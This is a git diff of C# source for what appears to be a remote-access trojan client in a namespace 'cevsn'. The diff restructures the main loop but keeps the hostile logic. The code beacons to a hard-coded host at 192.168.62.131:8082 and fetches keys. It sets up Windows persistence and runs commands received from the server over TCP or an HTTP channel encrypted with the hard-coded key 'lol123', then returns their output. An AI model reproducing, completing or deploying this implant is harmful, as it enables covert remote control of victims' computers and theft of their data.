@@ -329,102 +329,65 @@ namespace cevsn
             osName = getOsName();
             gotHostInformation = false;
             Running = true;
-            var taskList = new List<Task>();
-            taskList.Add(Task.Factory.StartNew(() => 
+            while(Running)
             {
-                while(Running)
+                while(gotHostInformation == false)
                 {
-                    while(gotHostInformation == false)
+                    URL = "http://192.168.62.131:8082/"+UUID+".txt";
+                    cont = getContent();
+                    if(cont == "")
                     {
-                        URL = "http://192.168.62.131:8082/"+UUID+".txt";
-                        cont = getContent();
-                        if(cont == "")
-                        {
-                            URL = "http://192.168.62.131:8082/initialRSA.txt";
-                            Update();
-                        } else {
-                            parseHostInformation(cont);
-                        }
-                        Thread.Sleep(3500);
+                        URL = "http://192.168.62.131:8082/initialRSA.txt";
+                        Update();
+                    } else {
+                        parseHostInformation(cont);
                     }
-                    Boolean checker = false;
-                    while(gotHostInformation)
+                    Thread.Sleep(3500);
+                }
+                Boolean checker = false;
+                while(gotHostInformation)
+                {
+                    if(counter > 5)
                     {
-                        if(counter > 5)
+                        gotHostInformation = false;
+                        counter = 0;
+                    }
+                    if(Type.Equals("TCP"))
+                    {
+                        Console.Write("Trying to connect to TCP...\n");
+                        if(checker == false)
                         {
-                            gotHostInformation = false;
-                            counter = 0;
+                            tevsn = CreateTevsn(IP, PORT, Key, osName);
+                            tevsn.ServerAddress = new IPEndPoint(IPAddress.Parse(IP), PORT);
+                            checker = true;
                         }
-                        if(Type.Equals("TCP"))
+                        if(tevsn!.Connect())
                         {
-                            Console.Write("Trying to connect to TCP...\n");
-                            if(checker == false)
+                            Console.Write("connected\n");
+                            IsConnected = tevsn.IsConnected();
+                            if(osName.Contains("Windows"))
                             {
-                                tevsn = CreateTevsn(IP, PORT, Key, osName);
-                                tevsn.ServerAddress = new IPEndPoint(IPAddress.Parse(IP), PORT);
-                                checker = true;
+                                Persist = new Pevsn();
                             }
-                            if(tevsn!.Connect())
+                            while(IsConnected)
                             {
-                                Console.Write("connected\n");
-                                IsConnected = tevsn.IsConnected();
-                                if(osName.Contains("Windows"))
+                                if(!first)
                                 {
-                                    Persist = new Pevsn();
-                                }
-                                while(IsConnected)
-                                {
-                                    if(!first)
+                                    try
                                     {
+                                        Console.Write("Sending to Server first Conn!\n");
+                                        tevsn.Send(UUID + ": just arrived to vacation on: " + osName);
+                                        URL = "http://"+IP+":8082/"+UUID+".txt";
+                                        Thread.Sleep(5000);
                                         try
                                         {
-                                            Console.Write("Sending to Server first Conn!\n");
-                                            tevsn.Send(UUID + ": just arrived to vacation on: " + osName);
-                                            URL = "http://"+IP+":8082/"+UUID+".txt";
-                                            Thread.Sleep(5000);
-                                            try
-                                            {
-                                                Update();
-                                                //rsa!.PrivKey = PrivKey;
-                                            } catch (Exception) {
-                                                Console.Write("Failed to get private key!\n");
-                                            }
-                                            string recv1 = tevsn.Receive();
-                                            if (recv1.Equals("reviveTime")) {
-                                                IsConnected = tevsn.IsConnected();
-                                                if(!IsConnected)
-                                                {
-                                                    tevsn.Fallback();
-                                                    first = false;
-                                                    break;
-                                                }
-                                            } else if(recv1.Equals("--")) {
-                                                tevsn.Send("keepalive");
-                                            } else if (recv1.Equals("httpSw")) {
-                                                Type = "HTTP";
-                                                firstHTTP = false;
-                                                Update();
-                                                tevsn.Disconnect();
-                                                break;
-                                            } else {
-                                                tevsn.Send(tevsn.exec(recv1));
-                                            }
-                                            IsConnected = tevsn.IsConnected();
-                                            first = true;
-                                            Thread.Sleep(1000);
+                                            Update();
+                                            //rsa!.PrivKey = PrivKey;
                                         } catch (Exception) {
-                                            IsConnected = tevsn.IsConnected();
-                                            if(!IsConnected)
-                                            {
-                                                first = false;
-                                                break;
-                                            }
+                                            Console.Write("Failed to get private key!\n");
                                         }
-                                    } else {
-                                        Console.Write("\nWaiting\n");
-                                        string recv = tevsn.Receive();
-                                        Console.Write(recv);
-                                        if (recv.Equals("reviveTime")) {
+                                        string recv1 = tevsn.Receive();
+                                        if (recv1.Equals("reviveTime")) {
                                             IsConnected = tevsn.IsConnected();
                                             if(!IsConnected)
                                             {
@@ -432,72 +395,103 @@ namespace cevsn
                                                 first = false;
                                                 break;
                                             }
-                                        } else if(recv.Equals("--")) {
+                                        } else if(recv1.Equals("--")) {
                                             tevsn.Send("keepalive");
-                                        } else if (recv.Equals("httpSw")) {
+                                        } else if (recv1.Equals("httpSw")) {
                                             Type = "HTTP";
                                             firstHTTP = false;
                                             Update();
                                             tevsn.Disconnect();
-                                            tevsn = null;
                                             break;
                                         } else {
-                                            tevsn.Send(tevsn.exec(recv));
+                                            tevsn.Send(tevsn.exec(recv1));
                                         }
-                                    }
-                                    Thread.Sleep(2500);
-                                }
-                            }
-                        }
-                        if(Type.Equals("HTTP"))
-                        {
-                            while(Type.Equals("HTTP"))
-                            {
-                            //hevsn = new Hevsn("http://192.168.62.131:8082:"+PORT+"/lit", rsa!);
-                                if(!firstHTTP)
-                                {
-                                    aes = new AES("lol123", iv);
-                                    hevsn = new Hevsn("http://"+IP+":"+PORT+"/lit", aes);
-                                    Thread.Sleep(2000);
-                                    hevsn.sendInit();
-                                    firstHTTP = true;
-                                }
-                                try
-                                {
-                                    hevsn!.getCommands("give");
-                                    if(hevsn.getCommand().Length > 1)
-                                    {
-                                        string comm = hevsn.getCommand();
-                                        if(!comm.Equals("") && comm.Length >= 2)
+                                        IsConnected = tevsn.IsConnected();
+                                        first = true;
+                                        Thread.Sleep(1000);
+                                    } catch (Exception) {
+                                        IsConnected = tevsn.IsConnected();
+                                        if(!IsConnected)
                                         {
-                                            if (comm.Equals("tcpSw")) 
-                                            {
-                                                Type = "TCP";
-                                                checker = false;
-                                                Update();
-                                                first = false;
-                                                hevsn = null;
-                                            } else if(comm.Equals("httpSw")) {
-                                                firstHTTP = false;
-                                            } else {
-                                                hevsn.SendOutp(hevsn.makeOutp(hevsn.exec(comm)));
-                                            }
+                                            first = false;
+                                            break;
                                         }
                                     }
-                                    Thread.Sleep(3000);
-                                } catch (NullReferenceException) {
-                                    firstHTTP = false;
+                                } else {
+                                    Console.Write("\nWaiting\n");
+                                    string recv = tevsn.Receive();
+                                    Console.Write(recv);
+                                    if (recv.Equals("reviveTime")) {
+                                        IsConnected = tevsn.IsConnected();
+                                        if(!IsConnected)
+                                        {
+                                            tevsn.Fallback();
+                                            first = false;
+                                            break;
+                                        }
+                                    } else if(recv.Equals("--")) {
+                                        tevsn.Send("keepalive");
+                                    } else if (recv.Equals("httpSw")) {
+                                        Type = "HTTP";
+                                        firstHTTP = false;
+                                        Update();
+                                        tevsn.Disconnect();
+                                        tevsn = null;
+                                        break;
+                                    } else {
+                                        tevsn.Send(tevsn.exec(recv));
+                                    }
                                 }
+                                Thread.Sleep(2500);
                             }
                         }
-                        counter++;
-                        Thread.Sleep(2000);
-
                     }
-                }
+                    if(Type.Equals("HTTP"))
+                    {
+                        while(Type.Equals("HTTP"))
+                        {
+                        //hevsn = new Hevsn("http://192.168.62.131:8082:"+PORT+"/lit", rsa!);
+                            if(!firstHTTP)
+                            {
+                                aes = new AES("lol123", iv);
+                                hevsn = new Hevsn("http://"+IP+":"+PORT+"/lit", aes);
+                                Thread.Sleep(2000);
+                                hevsn.sendInit();
+                                firstHTTP = true;
+                            }
+                            try
+                            {
+                                hevsn!.getCommands("give");
+                                if(hevsn.getCommand().Length > 1)
+                                {
+                                    string comm = hevsn.getCommand();
+                                    if(!comm.Equals("") && comm.Length >= 2)
+                                    {
+                                        if (comm.Equals("tcpSw")) 
+                                        {
+                                            Type = "TCP";
+                                            checker = false;
+                                            Update();
+                                            first = false;
+                                            hevsn = null;
+                                        } else if(comm.Equals("httpSw")) {
+                                            firstHTTP = false;
+                                        } else {
+                                            hevsn.SendOutp(hevsn.makeOutp(hevsn.exec(comm)));
+                                        }
+                                    }
+                                }
+                                Thread.Sleep(3000);
+                            } catch (NullReferenceException) {
+                                firstHTTP = false;
+                            }
+                        }
+                    }
+                    counter++;
+                    Thread.Sleep(2000);
 
-            }));
-            Task.WaitAll(taskList.ToArray());
+                }
+            }
             return 0;
         }
     }
